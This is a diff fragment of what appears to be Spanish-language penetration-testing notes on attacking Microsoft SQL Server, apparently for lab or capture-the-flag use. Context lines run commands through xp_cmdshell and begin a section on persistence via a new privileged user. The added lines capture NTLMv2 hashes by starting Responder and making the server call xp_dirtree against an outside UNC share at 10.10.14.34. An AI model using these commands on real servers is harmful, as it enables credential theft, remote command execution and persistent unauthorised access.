@@ -22,6 +22,11 @@
 - `RECONFIGURE;`
 - Entonces ahora: `EXEC xp_cmdshell 'whoami';`
 
+
+#### Exfiltrar NTLMv2-SSP
+- `sudo responder -I tun0`
+- `xp_dirtree \\10.10.14.34\share`
+
 #### Crear persistencia en MSSQL
 - Crear un nuevo usuario con privilegios:
     ```sql
